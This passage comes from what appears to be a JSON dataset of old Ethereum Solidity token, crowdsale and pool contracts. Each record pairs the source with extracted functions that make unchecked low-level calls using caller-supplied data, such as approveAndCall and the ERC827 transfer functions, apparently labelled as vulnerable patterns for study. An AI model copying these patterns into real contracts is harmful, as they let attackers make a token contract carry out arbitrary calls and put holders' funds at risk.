owner;\n uint public totalReward;\n mapping (address => uint) public rewardAtTimeOfWithdraw;\n mapping (address => uint) public owed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n function depositReward()\n public\n payable\n returns (bool)\n {\n totalReward += msg.value;\n return true;\n }\n function calcReward(address forAddress) private returns (uint) {\n return singularDTVToken.balanceOf(forAddress) * (totalReward - rewardAtTimeOfWithdraw[forAddress]) / singularDTVToken.totalSupply();\n }\n function withdrawReward()\n public\n returns (uint)\n {\n uint value = calcReward(msg.sender) + owed[msg.sender];\n rewardAtTimeOfWithdraw[msg.sender] = totalReward;\n owed[msg.sender] = 0;\n if (value > 0 && !msg.sender.send(value)) {\n revert();\n }\n return value;\n }\n function softWithdrawRewardFor(address forAddress)\n external\n returns (uint)\n {\n uint value = calcReward(forAddress);\n rewardAtTimeOfWithdraw[forAddress] = totalReward;\n owed[forAddress] += value;\n return value;\n }\n function setup(address singularDTVTokenAddress)\n external\n onlyOwner\n returns (bool)\n {\n if (address(singularDTVToken) == 0) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n return true;\n }\n return false;\n }\n function SingularDTVFund() {\n owner = msg.sender;\n }\n function ()\n public\n payable\n {\n if (msg.value == 0) {\n withdrawReward();\n } else {\n depositReward();\n }\n }\n}\ncontract SingularDTVLaunch {\n string public version = \"0.1.0\";\n event Contributed(address indexed contributor, uint contribution, uint tokens);\n AbstractSingularDTVToken public singularDTVToken;\n address public workshop;\n address public SingularDTVWorkshop = 0xc78310231aA53bD3D0FEA2F8c705C67730929D8f;\n uint public SingularDTVWorkshopFee;\n uint public CAP;\n uint public DURATION;\n uint public TOKEN_TARGET;\n enum Stages {\n Deployed,\n GoingAndGoalNotReached,\n EndedAndGoalNotReached,\n GoingAndGoalReached,\n EndedAndGoalReached\n }\n address public owner;\n uint public startDate;\n uint public fundBalance;\n uint public valuePerToken;\n uint public tokensSent;\n mapping (address => uint) public contributions;\n mapping (address => uint) public sentTokens;\n Stages public stage = Stages.Deployed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier atStage(Stages _stage) {\n if (stage != _stage) {\n revert();\n }\n _;\n }\n modifier atStageOR(Stages _stage1, Stages _stage2) {\n if (stage != _stage1 && stage != _stage2) {\n revert();\n }\n _;\n }\n modifier timedTransitions() {\n uint timeElapsed = now - startDate;\n if (timeElapsed >= DURATION) {\n if (stage == Stages.GoingAndGoalNotReached) {\n stage = Stages.EndedAndGoalNotReached;\n } else if (stage == Stages.GoingAndGoalReached) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n _;\n }\n function checkInvariants() constant internal {\n if (fundBalance > this.balance) {\n revert();\n }\n }\n function emergencyCall()\n public\n returns (bool)\n {\n if (fundBalance > this.balance) {\n if (this.balance > 0 && !SingularDTVWorkshop.send(this.balance)) {\n revert();\n }\n return true;\n }\n return false;\n }\n function fund()\n public\n timedTransitions\n atStageOR(Stages.GoingAndGoalNotReached, Stages.GoingAndGoalReached)\n payable\n returns (uint)\n {\n uint tokenCount = (msg.value * (10**18)) / valuePerToken;\n require(tokenCount > 0);\n if (tokensSent + tokenCount > CAP) {\n tokenCount = CAP - tokensSent;\n }\n tokensSent += tokenCount;\n uint contribution = (tokenCount * valuePerToken) / (10**18);\n if (msg.value > contribution && !msg.sender.send(msg.value - contribution)) {\n revert();\n }\n fundBalance += contribution;\n contributions[msg.sender] += contribution;\n sentTokens[msg.sender] += tokenCount;\n if (!singularDTVToken.transfer(msg.sender, tokenCount)) {\n revert();\n }\n if (stage == Stages.GoingAndGoalNotReached) {\n if (tokensSent >= TOKEN_TARGET) {\n stage = Stages.GoingAndGoalReached;\n }\n }\n if (stage == Stages.GoingAndGoalReached) {\n if (tokensSent == CAP) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n checkInvariants();\n Contributed(msg.sender, contribution, tokenCount);\n return tokenCount;\n }\n function withdrawContribution()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint tokensReceived = sentTokens[msg.sender];\n sentTokens[msg.sender] = 0;\n if (!singularDTVToken.transferFrom(msg.sender, owner, tokensReceived)) {\n revert();\n }\n uint contribution = contributions[msg.sender];\n contributions[msg.sender] = 0;\n fundBalance -= contribution;\n if (contribution > 0) {\n msg.sender.transfer(contribution);\n }\n checkInvariants();\n return contribution;\n }\n function withdrawForWorkshop()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalReached)\n returns (bool)\n {\n uint value = fundBalance;\n fundBalance = 0;\n require(value > 0);\n uint networkFee = value * SingularDTVWorkshopFee / 100;\n workshop.transfer(value - networkFee);\n SingularDTVWorkshop.transfer(networkFee);\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return true;\n }\n function withdrawUnsentTokensForOwner()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return remainingTokens;\n }\n function changeValuePerToken(uint valueInWei)\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (bool)\n {\n valuePerToken = valueInWei;\n return true;\n }\n function updateStage()\n public\n timedTransitions\n returns (Stages)\n {\n return stage;\n }\n function start()\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (uint)\n {\n if (!singularDTVToken.transferFrom(msg.sender, this, CAP)) {\n revert();\n }\n startDate = now;\n stage = Stages.GoingAndGoalNotReached;\n checkInvariants();\n return startDate;\n }\n function SingularDTVLaunch(\n address singularDTVTokenAddress,\n address _workshop,\n address _owner,\n uint _total,\n uint _unit_price,\n uint _duration,\n uint _threshold,\n uint _singulardtvwoskhop_fee\n ) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n workshop = _workshop;\n owner = _owner;\n CAP = _total;\n valuePerToken = _unit_price;\n DURATION = _duration;\n TOKEN_TARGET = _threshold;\n SingularDTVWorkshopFee = _singulardtvwoskhop_fee;\n }\n function ()\n public\n payable\n {\n if (stage == Stages.GoingAndGoalNotReached || stage == Stages.GoingAndGoalReached)\n fund();\n else if (stage == Stages.EndedAndGoalNotReached)\n withdrawContribution();\n else\n revert();\n }\n}\ncontract AbstractSingularDTVFund {\n function softWithdrawRewardFor(address forAddress) returns (uint);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract SingularDTVToken is StandardToken {\n string public version = \"0.1.0\";\n AbstractSingularDTVFund public singularDTVFund;\n string public name;\n string public symbol;\n uint8 public constant decimals = 18;\n function transfer(address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(msg.sender);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transfer(to, value);\n }\n function transferFrom(address from, address to, uint256 value)\n returns (bool)\n {\n singularDTVFund.softWithdrawRewardFor(from);\n singularDTVFund.softWithdrawRewardFor(to);\n return super.transferFrom(from, to, value);\n }\n function SingularDTVToken(address sDTVFundAddr, address _wallet, string _name, string _symbol, uint _totalSupply) {\n if(sDTVFundAddr == 0 || _wallet == 0) {\n revert();\n }\n balances[_wallet] = _totalSupply;\n totalSupply = _totalSupply;\n name = _name;\n symbol = _symbol;\n singularDTVFund = AbstractSingularDTVFund(sDTVFundAddr);\n Transfer(this, _wallet, _totalSupply);\n }\n}\ncontract TokitDeployer is Ownable {\n TokitRegistry public registry;\n mapping (uint8 => AbstractPaymentEscrow) public paymentContracts;\n event DeployedToken(address indexed _customer, uint indexed _projectId, address _token, address _fund);\n event DeployedCampaign(address indexed _customer, uint indexed _projectId, address _campaign);\n function TokitDeployer(address _owner, address _registry) {\n transferOwnership(_owner);\n registry = TokitRegistry(_registry);\n }\n function deployToken(\n address _customer, uint _projectId, uint8 _payedWith, uint _amountNeeded,\n address _wallet, string _name, string _symbol, uint _totalSupply\n )\n onlyOwner()\n {\n require(AbstractPaymentEscrow(paymentContracts[_payedWith]).getDeposit(_projectId) >= _amountNeeded);\n var (t,,) = registry.lookup(_customer, _projectId);\n require(t == address(0));\n SingularDTVFund fund = new SingularDTVFund();\n SingularDTVToken token = new SingularDTVToken(fund, _wallet, _name, _symbol, _totalSupply);\n fund.setup(token);\n registry.register(_customer, _projectId, token, fund);\n DeployedToken(_customer, _projectId, token, fund);\n }\n function deployCampaign(\n address _customer, uint _projectId,\n address _workshop, uint _total, uint _unitPrice, uint _duration, uint _threshold, uint _networkFee\n )\n onlyOwner()\n {\n var (t,f,c) = registry.lookup(_customer, _projectId);\n require(c == address(0));\n require(t != address(0) && f != address(0));\n SingularDTVLaunch campaign = new SingularDTVLaunch(t, _workshop, _customer, _total, _unitPrice, _duration, _threshold, _networkFee);\n registry.register(_customer, _projectId, campaign);\n DeployedCampaign(_customer, _projectId, campaign);\n }\n function setRegistryContract(address _registry)\n onlyOwner()\n {\n registry = TokitRegistry(_registry);\n }\n function setPaymentContract(uint8 _paymentType, address _paymentContract)\n onlyOwner()\n {\n paymentContracts[_paymentType] = AbstractPaymentEscrow(_paymentContract);\n }\n function deletePaymentContract(uint8 _paymentType)\n onlyOwner()\n {\n delete paymentContracts[_paymentType];\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1445"
  },
  "filename": "21027.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Scc is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function Scc() {\n balances[msg.sender] = 180000000000000000000000000;\n totalSupply = 180000000000000000000000000;\n name = \"Smart Coin Cash\";\n decimals = 18;\n symbol = \"Scc\";\n unitsOneEthCanBuy = 58400;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1446"
  },
  "filename": "21067.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferIDCContractOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\ncontract Contactable is Ownable {\n string public contactInformation;\n function setContactInformation(string info) onlyOwner public {\n contactInformation = info;\n }\n}\ncontract HasNoContracts is Ownable {\n function reclaimContract(address contractAddr) external onlyOwner {\n Ownable contractInst = Ownable(contractAddr);\n contractInst.transferIDCContractOwnership(owner);\n }\n}\ncontract HasNoTokens is CanReclaimToken {\n function tokenFallback(address from_, uint256 value_, bytes data_) pure external {\n from_;\n value_;\n data_;\n revert();\n }\n}\ncontract Destructible is Ownable {\n function Destructible() public payable { }\n function destroy() onlyOwner public {\n selfdestruct(owner);\n }\n function destroyAndSend(address _recipient) onlyOwner public {\n selfdestruct(_recipient);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract ERC20Basic {\n string internal _symbol;\n string internal _name;\n uint8 internal _decimals;\n uint internal _totalSupply;\n mapping (address => uint) internal _balanceOf;\n mapping (address => mapping (address => uint)) internal _allowances;\n function ERC20Basic(string symbol, string name, uint8 decimals, uint totalSupply) public {\n _symbol = symbol;\n _name = name;\n _decimals = decimals;\n _totalSupply = totalSupply;\n }\n function name() public constant returns (string) {\n return _name;\n }\n function symbol() public constant returns (string) {\n return _symbol;\n }\n function decimals() public constant returns (uint8) {\n return _decimals;\n }\n function totalSupply() public constant returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address _addr) public constant returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract BasicToken is ERC20Basic, Ownable {\n using SafeMath for uint256;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function freezeAccount(address target, bool freeze) onlyOwner external {\n frozenAccount[target] = freeze;\n emit FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(!frozenAccount[msg.sender]);\n require(_to != address(0));\n require(_value <= _balanceOf[msg.sender]);\n _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value);\n _balanceOf[_to] = _balanceOf[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balanceOf[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(!frozenAccount[_from] && !frozenAccount[_to] && !frozenAccount[msg.sender]);\n require(_to != address(0));\n require(_value <= _balanceOf[_from]);\n require(_value <= allowed[_from][msg.sender]);\n _balanceOf[_from] = _balanceOf[_from].sub(_value);\n _balanceOf[_to] = _balanceOf[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract PausableToken is StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(!frozenAccount[msg.sender] && !frozenAccount[_spender]);\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }\ncontract IdeaCoin is ERC20Basic(\"IDC\", \"IdeaCoin\", 18, 1000000000000000000000000), ERC827Token, PausableToken, Destructible, Contactable, HasNoTokens, HasNoContracts {\n using SafeMath for uint;\n event Burn(address _from, uint256 _value);\n event Mint(address _to, uint _value);\n function IdeaCoin() public {\n _balanceOf[msg.sender] = _totalSupply;\n }\n function totalSupply() public constant returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address _addr) public constant returns (uint) {\n return _balanceOf[_addr];\n }\n function burn(address _from, uint256 _value) onlyOwner external {\n require(_balanceOf[_from] >= 0);\n _balanceOf[_from] = _balanceOf[_from].sub(_value);\n _totalSupply = _totalSupply.sub(_value);\n emit Burn(_from, _value);\n }\n function mintToken(address _to, uint256 _value) onlyOwner external {\n require(!frozenAccount[msg.sender] && !frozenAccount[_to]);\n _balanceOf[_to] = _balanceOf[_to].add(_value);\n _totalSupply = _totalSupply.add(_value);\n emit Mint(_to,_value);\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(!frozenAccount[msg.sender] && !frozenAccount[_spender]);\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1447"
  },
  "filename": "21144.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a < b ? a : b;\n }\n}\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\ncontract NamiPool {\n using SafeMath for uint256;\n function NamiPool(address _escrow, address _namiMultiSigWallet, address _namiAddress) public {\n require(_namiMultiSigWallet != 0x0);\n escrow = _escrow;\n namiMultiSigWallet = _namiMultiSigWallet;\n NamiAddr = _namiAddress;\n }\n string public name = \"Nami Pool\";\n address public escrow;\n address public namiMultiSigWallet;\n address public NamiAddr;\n modifier onlyEscrow() {\n require(msg.sender == escrow);\n _;\n }\n modifier onlyNami {\n require(msg.sender == NamiAddr);\n _;\n }\n modifier onlyNamiMultisig {\n require(msg.sender == namiMultiSigWallet);\n _;\n }\n uint public currentRound = 1;\n struct ShareHolder {\n uint stake;\n bool isActive;\n bool isWithdrawn;\n }\n struct Round {\n bool isOpen;\n uint currentNAC;\n uint finalNAC;\n uint ethBalance;\n bool withdrawable;\n bool topWithdrawable;\n bool isCompleteActive;\n bool isCloseEthPool;\n }\n mapping (uint => mapping (address => ShareHolder)) public namiPool;\n mapping (uint => Round) public round;\n event UpdateShareHolder(address indexed ShareHolderAddress, uint indexed RoundIndex, uint Stake, uint Time);\n event Deposit(address sender,uint indexed RoundIndex, uint value);\n event WithdrawPool(uint Amount, uint TimeWithdraw);\n event UpdateActive(address indexed ShareHolderAddress, uint indexed RoundIndex, bool Status, uint Time);\n event Withdraw(address indexed ShareHolderAddress, uint indexed RoundIndex, uint Ether, uint Nac, uint TimeWithdraw);\n event ActivateRound(uint RoundIndex, uint TimeActive);\n function changeEscrow(address _escrow)\n onlyNamiMultisig\n public\n {\n require(_escrow != 0x0);\n escrow = _escrow;\n }\n function withdrawEther(uint _amount) public\n onlyEscrow\n {\n require(namiMultiSigWallet != 0x0);\n if (this.balance > 0) {\n namiMultiSigWallet.transfer(_amount);\n }\n }\n function withdrawNAC(uint _amount) public\n onlyEscrow\n {\n require(namiMultiSigWallet != 0x0 && _amount != 0);\n NamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\n if (namiToken.balanceOf(this) > 0) {\n namiToken.transfer(namiMultiSigWallet, _amount);\n }\n }\n function activateRound(uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isOpen == false && round[_roundIndex].isCloseEthPool == false && round[_roundIndex].isCompleteActive == false);\n round[_roundIndex].isOpen = true;\n currentRound = _roundIndex;\n ActivateRound(_roundIndex, now);\n }\n function deactivateRound(uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isOpen == true);\n round[_roundIndex].isOpen = false;\n }\n function tokenFallbackExchange(address _from, uint _value, uint _price) onlyNami public returns (bool success) {\n require(round[_price].isOpen == true && _value > 0);\n namiPool[_price][_from].stake = namiPool[_price][_from].stake.add(_value);\n round[_price].currentNAC = round[_price].currentNAC.add(_value);\n UpdateShareHolder(_from, _price, namiPool[_price][_from].stake, now);\n return true;\n }\n function activateUser(address _shareAddress, uint _roundId)\n onlyEscrow\n public\n {\n require(namiPool[_roundId][_shareAddress].isActive == false && namiPool[_roundId][_shareAddress].stake > 0);\n require(round[_roundId].isCompleteActive == false && round[_roundId].isOpen == false);\n namiPool[_roundId][_shareAddress].isActive = true;\n round[_roundId].finalNAC = round[_roundId].finalNAC.add(namiPool[_roundId][_shareAddress].stake);\n UpdateActive(_shareAddress, _roundId ,namiPool[_roundId][_shareAddress].isActive, now);\n }\n function deactivateUser(address _shareAddress, uint _roundId)\n onlyEscrow\n public\n {\n require(namiPool[_roundId][_shareAddress].isActive == true && namiPool[_roundId][_shareAddress].stake > 0);\n require(round[_roundId].isCompleteActive == false && round[_roundId].isOpen == false);\n namiPool[_roundId][_shareAddress].isActive = false;\n round[_roundId].finalNAC = round[_roundId].finalNAC.sub(namiPool[_roundId][_shareAddress].stake);\n UpdateActive(_shareAddress, _roundId ,namiPool[_roundId][_shareAddress].isActive, now);\n }\n function closeActive(uint _roundId)\n onlyEscrow\n public\n {\n require(round[_roundId].isCompleteActive == false && round[_roundId].isOpen == false);\n round[_roundId].isCompleteActive = true;\n }\n function changeWithdrawable(uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isOpen == false);\n round[_roundIndex].withdrawable = !round[_roundIndex].withdrawable;\n }\n function changeTopWithdrawable(uint _roundIndex)\n onlyEscrow\n public\n {\n require(round[_roundIndex].isCompleteActive == true && round[_roundIndex].isOpen == false);\n round[_roundIndex].topWithdrawable = !round[_roundIndex].topWithdrawable;\n }\n function depositEthPool(uint _roundIndex)\n payable public\n onlyEscrow\n {\n require(msg.value > 0 && round[_roundIndex].isCloseEthPool == false && round[_roundIndex].isOpen == false);\n if (msg.value > 0) {\n round[_roundIndex].ethBalance = round[_roundIndex].ethBalance.add(msg.value);\n Deposit(msg.sender, _roundIndex, msg.value);\n }\n }\n function withdrawEthPool(uint 